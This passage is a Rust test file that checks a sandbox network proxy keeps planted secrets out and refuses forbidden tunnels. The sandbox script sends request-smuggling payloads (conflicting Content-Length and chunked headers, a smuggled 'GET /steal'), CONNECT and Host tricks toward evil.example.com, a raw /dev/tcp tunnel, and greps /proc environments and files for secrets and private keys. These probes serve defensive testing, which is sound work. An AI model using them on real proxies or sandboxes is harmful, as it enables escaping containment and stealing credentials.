        .set(&project, info.clone(), SecretValue::new(SECRET))
        .unwrap();
    let proxies = NetProxies::from_env(secrets).unwrap();
    let core = Core::new("test");
    let session = SessionId("s1".into());
    let reporter = NetReporter::new(project, session.clone(), core.sink());
    let started = rt
        .block_on(proxies.start(
            session,
            Allowlist {
                hosts: vec![AllowedHost {
                    host: BOUND.into(),
                    port: None,
                }],
            },
            reporter,
            vec![info],
        ))
        .unwrap();
    let mut out = std::io::stdout();
    writeln!(out, "ovra-address={}", started.address).unwrap();
    writeln!(out, "ovra-ca={}", started.ca_bundle.unwrap().display()).unwrap();
    out.flush().unwrap();
    // Until the test closes this process's input.
    for _ in std::io::stdin().lock().lines() {}
}

#[test]
fn a_bound_secret_never_enters_the_sandbox() {
    use std::io::{BufRead as _, BufReader, Read as _, Write as _};

    let world = World::new("bound");
    let Some(sandbox) = world.sandbox() else {
        return;
    };
    // The user's proxy: it answers each CONNECT and then hangs up, so the
    // TLS the netproxy tries next fails. A request that passed the checks
    // gets 502, one they refused gets 400. It keeps what it was sent.
    let upstream = TcpListener::bind("127.0.0.1:0").unwrap();
    let up = upstream.local_addr().unwrap().port();
    let seen = std::sync::Arc::new(std::sync::Mutex::new(Vec::<u8>::new()));
    {
        let seen = seen.clone();
        std::thread::spawn(move || {
            for stream in upstream.incoming() {
                let Ok(mut stream) = stream else { return };
                let mut head = Vec::new();
                let mut byte = [0u8];
                while !head.ends_with(b"\r\n\r\n") && stream.read(&mut byte).is_ok_and(|n| n == 1) {
                    head.push(byte[0]);
                }
                let _ = stream.write_all(b"HTTP/1.1 200 Connection established\r\n\r\n");
                seen.lock().unwrap().extend(head);
            }
        });
    }
    // The sandbox's bundle is the roots the netproxy trusts plus the
    // session's CA. None of the machine's roots: nothing below depends on
    // them, and each request parses the whole bundle again (several hundred
    // roots where CA variables name extra bundles).
    let no_roots = world.file("no-roots.pem", "");
    let mut proxy = Command::new(std::env::current_exe().unwrap())
        .args(["secret_proxy", "--exact", "--ignored", "--nocapture"])
        .env("OVRA_SECRET_PROXY", "1")
        .env("HTTPS_PROXY", format!("http://127.0.0.1:{up}"))
        .env("SSL_CERT_FILE", &no_roots)
        .env_remove("SSL_CERT_DIR")
        .env_remove("NODE_EXTRA_CA_CERTS")
        .env_remove("CURL_CA_BUNDLE")
        .env_remove("REQUESTS_CA_BUNDLE")
        .env_remove("GIT_SSL_CAINFO")
        .env_remove("HTTP_PROXY")
        .env_remove("http_proxy")
        .env_remove("https_proxy")
        .env_remove("NO_PROXY")
        .env_remove("no_proxy")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .unwrap();
    let mut lines = BufReader::new(proxy.stdout.take().unwrap()).lines();
    let mut value = |key: &str| loop {
        let line = lines.next().unwrap().unwrap();
        if let Some(v) = line.strip_prefix(key) {
            break v.to_owned();
        }
    };
    let address = value("ovra-address=");
    let ca = PathBuf::from(value("ovra-ca="));
    let profile = world.profile(ProfileNetwork::Proxy {
        address,
        ca_bundle: Some(ca.clone()),
    });
    let checks = format!(
        "find the value in the environment: env | grep -q {pattern}
        find the value in a process: grep -qs {pattern} /proc/*/environ /proc/*/cmdline
        find the value in a file: grep -rqs {pattern} {root} {home} /tmp /var/tmp /run {ca_dir}
        find the CA key: grep -rqs 'PRIVATE KEY' {ca_dir}",
        // Never the value itself: the script is in a command line.
        pattern = "'ovra-planted-secre[t]'",
        root = world.root.display(),
        home = world.home.display(),
        ca_dir = ca.parent().unwrap().display(),
    );
    // Each request goes through its own tunnel, with TLS the sandbox
    // trusts through the bundle it was given; in parallel, each answer to
    // its own file, printed in order after.
    let send = |n: usize, name: &str, request: &str| {
        format!(
            "(echo \"{name}: $(printf '{request}' | openssl s_client -quiet -proxy 127.0.0.1:${{HTTPS_PROXY##*:}} -connect {BOUND}:443 -servername {BOUND} -CAfile \"$SSL_CERT_FILE\" -verify_return_error 2>/dev/null | tr -d '\\r' | sed -n '1p;$p' | paste -sd' ')\" > /tmp/answer-{n:02}) &\n"
        )
    };
    let host = format!("Host: {BOUND}\\r\\n");
    let mut script = attacks(&checks);
    for (n, (name, request)) in [
        (
            "a plain request",
            format!("GET / HTTP/1.1\\r\\n{host}\\r\\n"),
        ),
        (
            "length and chunked",
            format!(
                "POST / HTTP/1.1\\r\\n{host}Content-Length: 4\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\n"
            ),
        ),
        (
            "two lengths",
            format!(
                "POST / HTTP/1.1\\r\\n{host}Content-Length: 0\\r\\nContent-Length: 40\\r\\n\\r\\n"
            ),
        ),
        (
            "an odd transfer coding",
            format!("POST / HTTP/1.1\\r\\n{host}Transfer-Encoding: gzip, chunked\\r\\n\\r\\n"),
        ),
        (
            "a folded header",
            format!("GET / HTTP/1.1\\r\\n{host}X-A: a\\r\\n b\\r\\n\\r\\n"),
        ),
        ("a bare line feed", format!("GET / HTTP/1.1\\n{host}\\r\\n")),
        (
            "an upgrade",
            format!(
                "GET / HTTP/1.1\\r\\n{host}Upgrade: websocket\\r\\nConnection: Upgrade\\r\\n\\r\\n"
            ),
        ),
        (
            "CONNECT inside the tunnel",
            "CONNECT evil.example.com:443 HTTP/1.1\\r\\nHost: evil.example.com:443\\r\\n\\r\\n"
                .to_owned(),
        ),
        (
            "a target on another host",
            format!("GET https://evil.example.com/ HTTP/1.1\\r\\n{host}\\r\\n"),
        ),
        ("no Host", "GET / HTTP/1.1\\r\\n\\r\\n".to_owned()),
        (
            "two Hosts",
            format!("GET / HTTP/1.1\\r\\n{host}Host: evil.example.com\\r\\n\\r\\n"),
        ),
        (
            "another Host",
            "GET / HTTP/1.1\\r\\nHost: evil.example.com\\r\\n\\r\\n".to_owned(),
        ),
        (
            "a second request in the same write",
            format!("GET / HTTP/1.1\\r\\n{host}\\r\\nGET /steal HTTP/1.1\\r\\n{host}\\r\\n"),
        ),
    ]
    .into_iter()
    .enumerate()
    {
        script.push_str(&send(n, name, &request));
    }
    script.push_str("wait\ncat /tmp/answer-*\n");
    let out = run(&sandbox, &profile, &script, &[]);
    drop(proxy.stdin.take());
    let _ = proxy.wait();
    insta::assert_snapshot!("bound_secret", out);
    // The 502s came from the tunnel to the user's proxy, not from a failed
    // lookup. (Nothing after a request is ever sent upstream: the
    // netproxy's own tests show that, with a TLS server behind it.)
    let seen = String::from_utf8(seen.lock().unwrap().clone()).unwrap();
    assert!(seen.starts_with(&format!("CONNECT {BOUND}:443 ")), "{seen}");
}

/// A name `/etc/hosts` gives a loopback, private or link-local address,
/// other than `localhost`: the netproxy's own lookup is fully qualified
/// and misses it, the user's proxy on this machine finds it.
fn private_name_in_hosts_file() -> Option<String> {
    let hosts = fs::read_to_string("/etc/hosts").ok()?;
    hosts.lines().find_map(|line| {
        let line = line.split('#').next().unwrap_or("");
        let mut words = line.split_whitespace();
        let ip: std::net::IpAddr = words.next()?.parse().ok()?;
        let private = match ip {
            std::net::IpAddr::V4(ip) => ip.is_loopback() || ip.is_private() || ip.is_link_local(),
            std::net::IpAddr::V6(ip) => ip.is_loopback(),
        };
        let name = words.find(|w| {
            let w = w.to_ascii_lowercase();
            w != "localhost" && !w.ends_with(".localhost") && w.parse::<std::net::IpAddr>().is_err()
        })?;
        private.then(|| name.to_owned())
    })
}

/// Starts a netproxy that lists `OVRA_HOSTS_NAME`, chaining to the user's
/// proxy that `HTTPS_PROXY` names. Run by
/// [`a_name_in_the_hosts_file_never_reaches_the_users_proxy`] as a child
/// process, since the netproxy reads that variable from its own
/// environment. Prints the socket and each refusal, then serves until its
/// input closes.
#[test]
#[ignore = "a helper process of a_name_in_the_hosts_file_never_reaches_the_users_proxy"]
fn hosts_proxy() {
    // Only as the child the test starts, never on its own.
    let Some(name) = std::env::var_os("OVRA_HOSTS_NAME") else {
        return;
    };
    use std::io::{BufRead as _, Write as _};

    let rt = tokio::runtime::Builder::new_multi_thread()
        .worker_threads(1)
        .enable_all()
        .build()
        .unwrap();
    let secrets = std::sync::Arc::new(ovra_core::fakes::MemorySecrets::default());
    let proxies = NetProxies::from_env(secrets).unwrap();
    let core = Core::new("test");
    let mut events = core.subscribe();
    let session = SessionId("s1".into());
    let reporter = NetReporter::new(ProjectId("p1".into()), session.clone(), core.sink());
    let allow = Allowlist {
        hosts: vec![AllowedHost {
            host: name.into_string().unwrap(),
            port: None,
        }],
    };
    let started = rt
        .block_on(proxies.start(session, allow, reporter, Vec::new()))
        .unwrap();
    let mut out = std::io::stdout();
    writeln!(out, "ovra-address={}", started.address).unwrap();
    out.flush().unwrap();
    for _ in std::io::stdin().lock().lines() {}
    for refused in refusals(&mut events) {
        writeln!(out, "ovra-refused={refused}").unwrap();
    }
}

#[test]
fn a_name_in_the_hosts_file_never_reaches_the_users_proxy() {
    use std::io::{BufRead as _, BufReader, Read as _, Write as _};

    let world = World::new("hosts");
    let Some(sandbox) = world.sandbox() else {
        return;
    };
    let Some(name) = private_name_in_hosts_file() else {
        eprintln!("no private name other than localhost in /etc/hosts: skipped");
        return;
    };
    // The user's proxy: it answers every CONNECT and keeps what it got.
    let upstream = TcpListener::bind("127.0.0.1:0").unwrap();
    let up = upstream.local_addr().unwrap().port();
    let seen = std::sync::Arc::new(std::sync::Mutex::new(Vec::<u8>::new()));
    {
        let seen = seen.clone();
        std::thread::spawn(move || {
            for stream in upstream.incoming() {
                let Ok(mut stream) = stream else { return };
                let mut head = Vec::new();
                let mut byte = [0u8];
                while !head.ends_with(b"\r\n\r\n") && stream.read(&mut byte).is_ok_and(|n| n == 1) {
                    head.push(byte[0]);
                }
                let _ = stream.write_all(b"HTTP/1.1 200 Connection established\r\n\r\n");
                seen.lock().unwrap().extend(head);
            }
        });
    }
    let mut proxy = Command::new(std::env::current_exe().unwrap())
        .args(["hosts_proxy", "--exact", "--ignored", "--nocapture"])
        .env("OVRA_HOSTS_NAME", &name)
        .env("HTTPS_PROXY", format!("http://127.0.0.1:{up}"))
        .env_remove("HTTP_PROXY")
        .env_remove("http_proxy")
        .env_remove("https_proxy")
        .env_remove("NO_PROXY")
        .env_remove("no_proxy")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .unwrap();
    let mut lines = BufReader::new(proxy.stdout.take().unwrap()).lines();
    let address = loop {
        let line = lines.next().unwrap().unwrap();
        if let Some(v) = line.strip_prefix("ovra-address=") {
            break v.to_owned();
        }
    };
    let profile = world.profile(ProfileNetwork::Proxy {
        address,
        ca_bundle: None,
    });
    let script = format!(
        "exec 3<>/dev/tcp/127.0.0.1/${{HTTPS_PROXY##*:}} && printf 'CONNECT {name}:443 HTTP/1.1\\r\\nHost: {name}:443\\r\\n\\r\\n' >&3 && echo \"tunnel to a listed name from /etc/hosts: $(head -n1 <&3 | tr -d '\\r')\"\n"
    );
    let out = run(&sandbox, &profile, &script, &[]);
    drop(proxy.stdin.take());
    let refused: Vec<String> = lines
        .map_while(Result::ok)
        .filter_map(|l| {
            l.strip_prefix("ovra-refused=")
                .map(|r| r.replace(&name, "<name>"))
        })
        .collect();
    let _ = proxy.wait();
    insta::assert_snapshot!("hosts_file", out);
    insta::assert_debug_snapshot!("hosts_file_refused", refused);
    let seen = String::from_utf8(seen.lock().unwrap().clone()).unwrap();
    assert_eq!(seen, "", "the user's proxy was asked");
}
